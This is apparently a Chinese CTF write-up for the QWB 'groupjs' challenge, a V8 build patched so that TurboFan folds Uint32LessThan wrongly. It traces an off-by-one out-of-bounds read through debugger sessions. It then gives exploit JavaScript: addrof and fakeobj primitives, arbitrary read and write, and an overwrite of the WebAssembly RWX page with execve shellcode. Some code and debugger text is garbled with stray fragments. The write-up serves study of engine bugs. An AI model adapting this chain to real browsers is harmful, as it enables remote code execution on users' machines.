> 原文链接: https://www.anquanke.com//post/id/227535 


# qwb_groupjs


                                阅读量   
                                **229636**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t01c0d5b0af9d071365.png)](https://p0.ssl.qhimg.com/t01c0d5b0af9d071365.png)



## 0 环境搭建

```
git reset --hard 7.7.2
git apply &lt; ../diff.patch
gclient sync
./tools/dev/gm.py x64.release
./tools/dev/gm.py x64.debug
```

题目中给的是build.sh文件

```
u18@u18-oVirt-Node:~/v8/
#!/bin/bash
# needs depot_tools in the path
# git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
# export PATH="$PATH:/path/to/depot_tools"

# https://chromium.googlesource.com/chromium/src/+/master/docs/linux_build_instructions.md
fetch --nohooks chromium
cd src
build/install-build-deps.sh
gclient runhooks

# https://www.chromium.org/developers/how-tos/get-the-code/working-with-release-branches
git fetch --tags
git checkout f3ee5ef941cb  &lt;======
gclient sync

gn gen out/Default

pushd v8
git apply ../diff.patch
popd

autoninja -C out/Default chrome#
```



## 1 漏洞分析

```
diff --git a/src/compiler/machine-operator-reducer.cc b/src/compiler/machine-operator-reducer.cc
index a6a8e87cf4..164ab44fab 100644
--- a/src/compiler/machine-operator-reducer.cc
+++ b/src/compiler/machine-operator-reducer.cc
@@ -291,7 +291,7 @@ Reduction MachineOperatorReducer::Reduce(Node* node) `{`
       if (m.left().Is(kMaxUInt32)) return ReplaceBool(false);  // M &lt; x =&gt; false
       if (m.right().Is(0)) return ReplaceBool(false);          // x &lt; 0 =&gt; false
       if (m.IsFoldable()) `{`                                    // K &lt; K =&gt; K
-        return ReplaceBool(m.left().Value() &lt; m.right().Value());
+        return ReplaceBool(m.left().Value() &lt; m.right().Value() + 1);
       `}`
       if (m.LeftEqualsRight()) return ReplaceBool(false);  // x &lt; x =&gt; false
       if (m.left().IsWord32Sar() &amp;&amp; m.right().HasValue())
```

首先拿到的patch 脚本如上图所示

pacth的地方是上面的对应源码中下面的位置

src/compiler/machine-operator-reducer.cc

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t016623b7ed9eadebfc.png)

这个函数应该是优化时进行节点的简化用的. 比如x &lt; 0会被替换成false节点

这里patch的地方是’小于号’进行比较的时候, 将x &lt; y的结果替换成x&lt;y+1的结果(影响优化的时候的结果)



## 2 对漏洞的一些尝试

写的相对比较杂

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="2.1"></a>2.1

起初的是利用下面的poc进行尝试

```
function foo(num)
`{`
    let v = 1;

    return (v&lt;num);
`}`
const MAX_ITERATIONS = 100000;
print(foo(1));
print(foo(1));
// for(var i=0;i&lt;MAX_ITERATIONS;i++)
// `{`
//     foo(1);
// `}`
%OptimizeFunctionOnNextCall(foo);
print(foo(1));
```

想法是,本来1&lt;1是false结果,但是根据上面的patch脚本会优化成1&lt;1+1,优化的时候会变成True节点,从而在优化图上有一定的体现

程序的运行结果如下图所示

```
Concurrent recompilation has been disabled for tracing.
false
false
---------------------------------------------------
Begin compiling method foo using TurboFan图
---------------------------------------------------
Finished compiling method foo using TurboFan
false
```

全部输出false

看一下优化图

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e537c93922847653.png)

可以看到speculativeNumberLessThan节点还是存在的, 并没有被替换

原因是我们将一个参数传进来作比较,优化器起初并不知道我们传得是Uint32(上面的patch针对的是Uint32)

[![](https://p2.ssl.qhimg.com/t01bcc8e78a05c530bd.png)](https://p2.ssl.qhimg.com/t01bcc8e78a05c530bd.png)

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="2.2"></a>2.2

针对上面的情况, 尝试将参数转化成局部变量

Poc2.js

```
function foo()
`{`
    let v = 1;
    var num = 1;
    return (v&lt;num);
`}`
const MAX_ITERATIONS = 100000;
print(foo());
print(foo());
// for(var i=0;i&lt;MAX_ITERATIONS;i++)
// `{`
//     foo(1);
// `}`
%OptimizeFunctionOnNextCall(foo);
print(foo());
```

运行的结果如下

```
Concurrent recompilation has been disabled for tracing.
false
false
---------------------------------------------------
Begin compiling method foo using TurboFan
---------------------------------------------------
Finished compiling method foo using TurboFan
false
```

优化图谱(TyperLowering)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01176d340c4af90fe1.png)

在TyperLowering 阶段优化图中已经没有了LessThan节点 并被替换成了false节点(上面的23号节点)

按照我的想法,应该是True节点呀….

调一下源码,看一下对应位置是如何优化的

[![](https://p3.ssl.qhimg.com/t0167c3bb403c8e294f.png)](https://p3.ssl.qhimg.com/t0167c3bb403c8e294f.png)

然后并没有断下来, 说明程序并没有走我们patch的优化函数

猜测是类型出了问题,因为这个patch是只针对Uint32类型

```
// if(argg == 1)
// `{`
    // %DebugPrint(oob);
// `}`
```

重新看patch中源码的位置, 对应的cc文件是machine-operator-reducer.cc,想起了前两天看的资料,这个文件中的函数应该是在TyperLowering阶段之后应用的,因为machiner 节点是这个优化之后的. 而且要得到的是Uint32类型的machine 节点,那么其对应的比较节点应该是Uint32Lessthan

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="2.3"></a>2.3

因为我们希望Turbofan较晚的发现我们的比较数值,所以根据之前浮现的一个洞,想到了 let m = `{`o:1`}`的方法,使得优化的时候在Escape阶段才发现我们比较的对象

poc3.js

```
function foo()
`{`
    let v = 1;
    // var num = 1;
    let m = `{`o:1`}`;
    return (v&lt;m.o);
`}`
const MAX_ITERATIONS = 100000;
print(foo());
print(foo());
// for(var i=0;i&lt;MAX_ITERATIONS;i++)
// `{`
//     foo(1);
// `}`
readline();
%OptimizeFunctionOnNextCall(foo);
print(foo());
```

运行结果

```
Concurrent recompilation has been disabled for tracing.
false
false

---------------------------------------------------
Begin compiling method foo using TurboFan
---------------------------------------------------
Finished compiling method foo using TurboFan
false
[Thread 0x7fbf10887700 (LWP 11350) exited]
[Thread 0x7fbf11088700 (LWP 11349) exited]
[Inferior 1 (process 11348) exited normally]
```

同样下断点调试源码,发现还是没有经过patch的地方

到现在面临的主要问题是,如何触发patch对应的Uint32Lessthan比较……

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="2.4"></a>2.4

这个时候不知道如何继续下去,得想办法触发Uint32Lessthan比较,于是直接上bing搜…..

结果还真搜到了一篇文章

[![](https://p3.ssl.qhimg.com/t01414d7ad3ea9b153e.png)](https://p3.ssl.qhimg.com/t01414d7ad3ea9b153e.png)

文章涉及的漏洞是chrome issue 762874,但是博主使用的v8版本与我之前浮现的不同,这个版本相对比较新,里面的优化流程略有不同,于是开始阅读文章,并同时加深一下之前浮现的洞的印象.博主使用的是v8 7.5.0

下面从博主的分析 优化图解 与 源码调试几方面搞清楚里面的优化流程

首先跟一下这个checkBound节点的优化流程

simplified-lowering.cc visitCheckbound函数

[![](https://p1.ssl.qhimg.com/t01dd0ca9f3cd087667.png)](https://p1.ssl.qhimg.com/t01dd0ca9f3cd087667.png)

注意选中的那一行,从原来的消除checkBound节点,变成了将节点转化成CheckedUint32Bounds

之后继续追simplified-lowering之后的优化

在effect-Control-Linearizer.cc 中有对上面checkeduint32Bounds的优化,同样我们在这个函数的第四行看到了期待的&lt;u&gt;Uint32lessThan&lt;/u&gt;, 在这里checkeduint32Bounds节点会变成Uint32lessThan节点以及一系列的其他节点

[![](https://p5.ssl.qhimg.com/t014a9c37d3511e690a.png)](https://p5.ssl.qhimg.com/t014a9c37d3511e690a.png)

这个函数总共有两条分支,程序会走下面的kAbort….分支

```
xit+111&gt;    mov    qword ptr [r13 + 0x2fd0], 1
──────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7ffed979d680 ◂— 0x7ffed979d680
01:0008│      0x7ffed979d688 ◂— 0x6
02:0010│ rbp  0x7ffed979d690 —▸ 0x7ffed979d6c0 —▸ 0x7ffed979d720 —▸ 0x7ffed979d748 —▸ 0x7ffed979d7b0 ◂— ...
03:0018│      0x7ffed979d698 —▸ 0x7f439444d40b (Builtins_InterpreterEntryTrampoline+299) ◂— mov    rcx, rax
04:0020│ r15  0x7ffed979d6a0 —▸ 0x8e6c271f881 ◂— 0x21000004e4c70803
05:0028│      0x7ffed979d6a8 —▸ 0x16d3aa8004d1 ◂— 0x16d3aa8005
06:0030│      0x7ffed979d6b0 —▸ 0x8e6c271f881 ◂— 0x21000004e4c70803
07:0038│      0x7ffed979d6b8 ◂— 0x22 /* '"' */
────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; p params.mode()
$13 = (anonymous namespace)::(anonymous namespace)::(anonymous namespace)::CheckBoundsParameters::kAbortOnOutOfBounds
```

为了看这一步的优化情况,写一个JS,查看一下优化图解

两条分支如下

[![](https://p1.ssl.qhimg.com/t011cb022e0d9677e84.png)](https://p1.ssl.qhimg.com/t011cb022e0d9677e84.png)

如果是True的话,就会返回我们访问的对象,如果是false的话就会到达ret

动态调试(运行起来之后才能在源码下断点)一下上面的流程

第一处

[![](https://p3.ssl.qhimg.com/t019d2aae04a0202623.png)](https://p3.ssl.qhimg.com/t019d2aae04a0202623.png)

第二处断在下面的位置

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e25f5d3f45bdc8b0.png)

打印一下index limit信息并进入到Uint32LessThan函数中这样写的话如何这样写的话如何

[![](https://p5.ssl.qhimg.com/t01f60f022191fad017.png)](https://p5.ssl.qhimg.com/t01f60f022191fad017.png)

￼第三处断在了

```
In file: /home/u18/v8/src/compiler/machine-operator-reducer.cc
   285       `}`
   286       if (m.LeftEqualsRight()) return ReplaceBool(true);  // x &lt;= x =&gt; true
   287       break;
   288     `}`
   289     case IrOpcode::kUint32LessThan: `{`
 ► 290       Uint32BinopMatcher m(node);shih
   291       if (m.left().Is(kMaxUInt32)) return ReplaceBool(false);  // M &lt; x =&gt; false
   292       if (m.right().Is(0)) return ReplaceBool(false);          // x &lt; 0 =&gt; false
   293       if (m.IsFoldable()) `{`                                    // K &lt; K =&gt; K
   294         return ReplaceBool(m.left().Value() &lt; m.right().Value() + 1);//比较的时候左边是index 右边是length
   295       `}`
```

在effect-linearizaton阶段

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t013d9843d7cc9227ac.png)

如果是Ture就会到分支右侧的loadElement , 如果是False就会到unreachable

所以这里就涉及到了具体的漏洞位置,就是当访问数组的时候,其中有一个Uint32LessThan比较,优化返回True就越界成功了

```
if (m.IsFoldable()) `{`                                    // K &lt; K =&gt; K
        return ReplaceBool(m.left().Value() &lt; m.right().Value() + 1);//比较的时候左边是index 右边是length
```

源码中patch的位置如上

所以如果length = 4 我们输入的index = 4实际上是优化出True, 可以访问

而oob[4]实现了off-by-one

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="2.5"></a>2.5

尝试用数组越界进行漏洞的触发

```
function foo()
`{`
    let oob = [1.0,1.1,1.2];
    let m = `{`o:4`}`;

    return oob[m.o];
`}`0x7fffffff
// const MAX_ITERATIONS = 100000;
print(foo());
print(foo());
// for(var i=0;i&lt;MAX_ITERATIONS;i++)
// `{`
//     foo(1);
// `}`0x7fffffff
readline();
%OptimizeFunctionOnNextCall(foo);
print(foo());
```

同样在源码中下断点,查看触发情况

上面的脚本段在了下面的位置

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015aeceaff6aef7d0d.png)

输出一下节点的情况

```
0x7fffffffpwndbg&gt; print m
$1 = `{`
  &lt;(anonymous namespace)::(anonymous namespace)::(anonymous namespace)::NodeMatcher&gt; = `{`
    node_ = 0x55b2010c6c10
  `}`, 
  members of (anonymous namespace)::(anonymous namespace)::(anonymous namespace)::BinopMatcher&lt;v8::internal::compiler::IntMatcher&lt;unsigned int, v8::internal::compiler::IrOpcode::kInt32Constant&gt;, v8::internal::compiler::IntMatcher&lt;unsigned int, v8::internal::compiler::IrOpcode::kInt32Constant&gt; &gt;: 
  left_ = `{`
    &lt;(anonymous namespace)::(anonymous namespace)::(anonymous namespace)::ValueMatcher&lt;unsigned int, v8::internal::compiler::IrOpcode::kInt32Constant&gt;&gt; = `{`
      &lt;(anonymous namespace)::(anonymous namespace)::(anonymous namespace)::NodeMatcher&gt; = `{`
        node_ = 0x55b201109628
      `}`, 
      members of (anonymous namespace)::(anonymous namespace)::(anonymous namespace)::ValueMatcher&lt;unsigned int, v8::internal::compiler::IrOpcode::kInt32Constant&gt;: 
      value_ = 4, 
      has_value_ = true
    `}`, &lt;No data fields&gt;`}`, 
  right_ = `{`
    &lt;(anonymous namespace)::(anonymous namespace)::(anonymous namespace)::ValueMatcher&lt;unsigned int, v8::internal::compiler::IrOpcode::kInt32Constant&gt;&gt; = `{`
      &lt;(anonymous namespace)::(anonymous namespace)::(anonymous namespace)::NodeMatcher&gt; = `{`
        node_ = 0x55b201109ae8
      `}`, 
      members of (anonymous namespace)::(anonymous namespace)::(anonymous namespace)::ValueMatcher&lt;unsigned int, v8::internal::compiler::IrOpcode::kInt32Constant&gt;: 
      value_ = 3, 
      has_value_ = true
    `}`, &lt;No data fields&gt;`}`
`}`
```

可以看到right的value的值是3, left的value值是4(4&lt;3+1 返回false)

对应到VisitcheckBound的源码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t017fbf19de677c33b4.png)

这里返回False会抛出异常, 导致segent fault

所以上面应该返回True才对

改一下上面的POC,改了一个数字而已

```
In file: /home/u18/v8/src/compiler/simplified-lowering.cc
   1584               CheckBoundsParameters::kDeoptOnOutOfBounds;
   1585           if (lowering-&gt;poisoning_level_ ==
   1586                   PoisoningMitigationLevel::kDontPoison &amp;&amp;
   1587               (index_type.IsNone() || length_type.IsNone() ||
   1588                (index_type.Min() &gt;= 0.0 &amp;&amp;
 ► 1589                 index_type.Max() &lt; length_type.Min()))) `{`
   1590             // The bounds check is redundant if we already know that
   1591             // the index is within the bounds of [0.0, length[.
   1592             mode = CheckBoundsParameters::kAbortOnOutOfBounds;
   1593           `}`
   1594           NodeProperties::ChangeOp(
──────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7ffe524f3(m.left().Value() &lt; m.right().Value() + 1)610 ◂— 0x524f3502524f3704
01:0008│      0x7ffe524f3618 ◂— 0x7f0000000000
02:0010│      0x7ffe524f3620 ◂— 0x0
03:0018│      0x7ffe524f3628 ◂— 0x1ffffffff
04:0020│      0x7ffe524f3630 —▸ 0x7ffe524f3650 ◂— 0xffffffff
05:0028│      0x7ffe524f3638 ◂— 0x2ac9a897c
06:0030│      0x7ffe524f3640 —▸ 0x7ffe524f7130 —▸ 0x5561445706c8 —▸ 0x5561445705f8 —▸ 0x5561445645e0 ◂— ...
07:0038│      0x7ffe524f3648 —▸ 0x7ffe524f3700 ◂— 0x0
────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0     7fadada66dab
   f 1     7fadada585ac
   f 2     7fadada4cf10 v8::internal::compiler::RepresentationSelector::Run(v8::internal::compiler::SimplifiedLowering*)+432
   f 3     7fadada47a47 v8::internal::compiler::SimplifiedLowering::LowerAllNodes()+199
   f 4     7fadad9ef710
   f 5     7fadad9e75b4
   f 6     7fadad9ddfc1 v8::internal::compiler::PipelineImpl::OptimizeGraph(v8::internal::compiler::Linkage*)+385
   f 7     7fadad9dddad v8::internal::compiler::PipelineCompilationJob::ExecuteJobImpl()+413
   f 8     7fadac91f626 v8::internal::OptimizedCompilationJob::ExecuteJob()+214
   f 9     7fadac92a24c
   f 10     7fadac923507
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; i registers xmm0
xmm0           `{`
  v4_float = `{`0x0, 0x1b, 0x0, 0x0`}`, 
  v2_double = `{`0x7fffffff, 0x0`}`, 
  v16_int8 = `{`0x0, 0x0, 0xc0, 0xff, 0xff, 0xff, 0xdf, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0`}`, 
  v8_int16 = `{`0x0, 0xffc0, 0xffff, 0x41df, 0x0, 0x0, 0x0, 0x0`}`, 
  v4_int32 = `{`0xffc00000, 0x41dfffff, 0x0, 0x0`}`, 
  v2_int64 = `{`0x41dfffffffc00000, 0x0`}`, 
  uint128 = 0x000000000000000041dfffffffc00000
jbefunction foo()
`{`
    let oob = [1.0,1.1,1.2];
    let m = `{`o:3`}`;   &lt;============改动的位置

    return oob[m.o];
`}`
// const MAX_ITERATIONS = 100000;
print(foo());
print(foo());
// for(var i=0;i&lt;MAX_ITERATIONS;i++)
// `{`
//     foo(1);
// `}`
readline();
%OptimizeFunctionOnNextCall(foo);
print(foo());
```

这样上面的脚本就形成了off-by-one

之后的操作就如2019 *ctf oob了~~~



## 3 exp

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="3.1"></a>3.1

基本的思路和*ctf oob类似　这里就不多写了

泄露map值

```
function foo()
`{`
    // let oob;
    // let obj_array;
    oob = [1.0,1.1,1.2];
    obj_array = [oob];//
    let m = `{`o:3`}`;
    // if(argg == 1)
    // `{`
    //     %DebugPrint(obj_array);
    //     %DebugPrint(oob);
    // `}`

    return oob[m.o];
`}`
// const MAX_ITERATIONS = 100000;
foo();
for(var i=0;i&lt;MAX_ITERATIONS;i++)
`{`
    foo();
`}`
// readline();
let float_array_map = foo();
console.log('[*] array map ===&gt; '+hex(f2i(float_array_map)));



let obj_array_map = i2f(f2i(float_array_map)+0xa0);
console.log('[*] obj_array_map===&gt; '+hex(f2i(obj_array_map)));
```

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="3.2"></a>3.2

伪造float_obj

```
function fakeobj_opt(addr)
`{`
    let array = [addr,addr];
    let o = `{`x:2`}`;
    array[o.x] = obj_array_map;
    return array
`}`

for(var i=0;i&lt;0x10000;i++)
`{`
    fakeobj_opt(float_array_map);
`}`//

function fakeObj(addr)//参数浮点型　　返回值浮点型
`{`
    // print(hex(f2i(addr)));

    let ret = fakeobj_opt(addr);
    // %DebugPrint(ret);
    return ret[0];
`}`
var float_map_obj = fakeObj(float_array_map);//ｆａｋｅ
```

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="3.3"></a>3.3

addrof原语

```
function addrof_opt(obj)
`{`
    let array = [obj,obj];
    let o = `{`x:2`}`;
    array[o.x] = float_map_obj;
    return array;
`}`

var temp_obj = `{`"a":1`}`;

for(var i=0;i&lt;MAX_ITERATIONS;i++)
`{`
    addrof_opt(temp_obj);
`}`//

function addrof(obj)//传入obj型  返回浮点
`{`
    let ret = addrof_opt(obj); 
    // %DebugPrint(ret);
    return ret[0];
`}`
```

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="3.4"></a>3.4

任意地址读写

```
function abread(addr)//参数整形　　返回值整形
`{`
    let adddr = addrof(fake_array);


    let test = fakeObj(i2f(f2i(adddr)-0x20));//这里的-0x..与上面fake_array的大小有关
    // %DebugPrint(test);//这是个obj　不能print

    // readline();
    fake_array[2]=i2f(addr-0x10);
    return f2i(test[0]);
`}`

function abwrite(addr,data)//参数为整
`{`
    let adddr = addrof(fake_array);


    let test = fakeObj(i2f(f2i(adddr)-0x20));
    fake_array[2] = i2f(addr-0x10);
    test[0] = i2f(data);
`}`
```

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="3.5"></a>3.5

利用backstore写wasm_rwx

```
var share_info = abread(leak_f + 0x18);
console.log("[*] share_info ====&gt; "+hex(share_info));


var wasm_data = abread(share_info+8);
console.log("[*] wasm_data ====&gt; "+hex(wasm_data));

var wasm_instance = abread(wasm_data+16);
console.log("[*] wasm_instance ====&gt; "+hex(wasm_instance));

var wasm_rwx = abread(wasm_instance+0x88);//这里都没有写－１　　因为obj
console.log("[*] wasm_rwx ====&gt; "+hex(wasm_rwx));
//




var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];


let buf_new = new ArrayBuffer(0x200);
let dataview = new DataView(buf_new);
let leak_buf = f2i(addrof(buf_new));
let fake_write = leak_buf + 0x20;//get backstore

abwrite(fake_write,wasm_rwx);
console.log("[*] fake_write  ====&gt; "+hex(fake_write));


for(var i=0;i&lt;shellcode.length;i++)
`{`
    dataview.setUint8(i,shellcode[i],true);
`}`
// %DebugPrint(buf_new);
// %SystemBreak();


f();
```



## 4 利用效果

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0104f17d069a3f9352.png)



## 5 问题

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="%E5%85%B3%E4%BA%8E%E9%A2%98%E7%9B%AE%EF%BC%9A"></a>关于题目：

如何找到v8 与 chrome的对应关系

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="%E5%85%B3%E4%BA%8E%E4%BC%98%E5%8C%96%EF%BC%9A"></a>关于优化：

调试的时候visit_check_bound 打印index_type 后来采用单步跟踪的方式

为什么length_type.Min()一定是最大值

```
In file: /home/u18/v8/src/compiler/simplified-lowering.cc
   1584               CheckBoundsParameters::kDeoptOnOutOfBounds;
   1585           if (lowering-&gt;poisoning_level_ ==
   1586                   PoisoningMitigationLevel::kDontPoison &amp;&amp;
   1587               (index_type.IsNone() || length_type.IsNone() ||
   1588                (index_type.Min() &gt;= 0.0 &amp;&amp;yuejie
 ► 1589                 index_type.Max() &lt; length_type.Min()))) `{`
   1590             // The bounds check is redundant if we already know that
   1591             // the index is within the bounds of [0.0, length[.
   1592             mode = CheckBoundsParameters::kAbortOnOutOfBounds;
   1593           `}`
   1594           NodeProperties::ChangeOp(
──────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp  0x7ffe524f3610 ◂— 0x524f3502524f3704
01:0008│      0x7ffe524f3618 ◂— 0x7f0000000000
02:0010│      0x7ffe524f3620 ◂— 0x0
03:0018│      0x7ffe524f3628 ◂— 0x1ffffffff
04:0020│      0x7ffe524f3630 —▸ 0x7ffe524f3650 ◂— 0xffffffff
05:0028│      0x7ffe524f3638 ◂— 0x2ac9a897c
06:0030│      0x7ffe524f3640 —▸ 0x7ffe524f7130 —▸ 0x5561445706c8 —▸ 0x5561445705f8 —▸ 0x5561445645e0 ◂— ...
07:0038│      0x7ffe524f3648 —▸ 0x7ffe524f3700 ◂— 0x0
────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────────────
 ► f 0     7fadada66dab
   f 1     7fadada585ac
   f 2     7fadada4cf10 v8::internal::compiler::RepresentationSelector::Run(v8::internal::compiler::SimplifiedLowering*)+432
   f 3     7fadada47a47 v8::internal::compiler::SimplifiedLowering::LowerAllNodes()+199
   f 4     7fadad9ef710
   f 5     7fadad9e75b4
   f 6     7fadad9ddfc1 v8::internal::compiler::PipelineImpl::OptimizeGraph(v8::internal::compiler::Linkage*)+385
   f 7     7fadad9dddad v8::internal::compiler::PipelineCompilationJob::ExecuteJobImpl()+413
   f 8     7fadac91f626 v8::internal::OptimizedCompilationJob::ExecuteJob()+214
   f 9     7fadac92a24c
   f 10     7fadac923507
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt; i registers xmm0
xmm0           `{`
  v4_float = `{`0x0, 0x1b, 0x0, 0x0`}`, 
  v2_double = `{`0x7fffffff, 0x0`}`, 
  v16_int8 = `{`0x0, 0x0, 0xc0, 0xff, 0xff, 0xff, 0xdf, 0x41, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0`}`, 
  v8_int16 = `{`0x0, 0xffc0, 0xffff, 0x41df, 0x0, 0x0, 0x0, 0x0`}`, 
  v4_int32 = `{`0xffc00000, 0x41dfffff, 0x0, 0x0`}`, 
  v2_int64 = `{`0x41dfffffffc00000, 0x0`}`, 
  uint128 = 0x000000000000000041dfffffffc00000
```

就是说一定会进入这个状态喽?

```
mode = CheckBoundsParameters::kAbortOnOutOfBounds;(m.left().Value() &lt; m.right().Value() + 1)
```

```
这样写的话如何
function foo()
`{`
    let oob = [1.0,1.1,1.2,1.4];
    let m = `{`o:4`}`;

    return oob[4];
`}`
```

这样写的话如何

还是会走到compiler/machine-operator-reducer.cc 但是length值是0x7ff….

因为在LoadElimination Phase阶段，消除了LoadElement节点，idx变量被LoadElimination中的常数折叠直接消除了，无法加载数组进行访问。????

那~~~ 之前没有+1优化的时候 岂不是就可以直接越界?

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="%E5%85%B3%E4%BA%8E%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%EF%BC%9A"></a>关于脚本编写：

这里为什么一定要把let oob放到函数的里面　　没有想清楚

#### <a class="reference-link" style="background-image: url('img/anchor.gif');" name="%E5%85%B3%E4%BA%8E%E8%BF%90%E8%A1%8C%E6%97%B6%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%9A"></a>关于运行时的问题：

```
泄露地址时出现下面的情况
0x2ec93f2e4cb1 &lt;JSFunction 0 (sfi = 0x2ec93f2e4c79)&gt;
[*] leak_f ====&gt; 0x00002ec93f2e4cb1
0x32c0943f9681 &lt;JSArray[2]&gt;
[*] share_info ====&gt; 0x7ff8000000000000
0x32c0943f9bc1 &lt;JSArray[2]&gt;
[*] wasm_data ====&gt; 0x7ff8000000000000
0x32c0943fa0a1 &lt;JSArray[2]&gt;
[*] wasm_instance ====&gt; 0x7ff8000000000000
0x32c0943fa589 &lt;JSArray[2]&gt;
[*] wasm_rwx ====&gt; 0x7ff8000000000000

解决：
整数与浮点数的转化没有整明白
写函数的时候标注出来最好
```



## 6 参考

[https://docs.google.com/presentation/d/1DJcWByz11jLoQyNhmOvkZSrkgcVhllIlCHmal1tGzaw/edit#slide=id.g52a72d9904_0_35](https://docs.google.com/presentation/d/1DJcWByz11jLoQyNhmOvkZSrkgcVhllIlCHmal1tGzaw/edit#slide=id.g52a72d9904_0_35)



## 7 知识技巧

浮点数汇编比较

```
ucomisd S1,S2     S2-S1     比较双精度值
```

查看寄存器状态

```
pwndbg&gt; i registers xmm1
xmm1           `{`
  v4_float = `{`0x0, 0x2, 0x0, 0x0`}`, 
  v2_double = `{`0x3, 0x0`}`, 
